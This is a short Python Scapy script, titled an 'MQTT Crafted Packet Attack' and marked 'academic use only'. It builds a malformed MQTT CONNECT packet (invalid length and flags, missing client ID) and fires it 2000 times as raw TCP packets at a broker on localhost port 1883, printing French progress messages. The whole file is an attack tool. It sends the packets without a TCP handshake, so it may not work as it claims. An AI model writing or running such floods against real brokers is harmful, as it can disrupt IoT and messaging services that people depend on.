from scapy.all import IP, TCP, Raw, send, RandShort

"""
MQTT Crafted Packet Attack
Purpose: Send malformed MQTT CONNECT packets to the broker
Academic use only
"""

# 🚨 Malformed MQTT CONNECT packet
mqtt_malformed_connect = bytes([
    0x10, 0x00,        # Fixed header + invalid remaining length
    0x00, 0x04,        # Length of protocol name
    0x4D, 0x51, 0x54, 0x54,  # "MQTT"
    0x04,              # Protocol level (MQTT 3.1.1)
    0x00,              # Invalid flags (should be 0x02)
    0x00, 0x3C         # Keep Alive = 60 seconds
    # 🚨 Missing Client ID
])

# Target MQTT broker
target_ip = "127.0.0.1"
target_port = 1883

print(f"🚀 Envoi de paquets MQTT malformés vers {target_ip}:{target_port}")

for i in range(2000):
    pkt = (
        IP(dst=target_ip)
        / TCP(dport=target_port, sport=RandShort())
        / Raw(load=mqtt_malformed_connect)
    )
    send(pkt, verbose=False)
    print(f"📤 Paquet {i + 1} envoyé")

print("✅ Attaque MQTT Crafted Packet terminée")
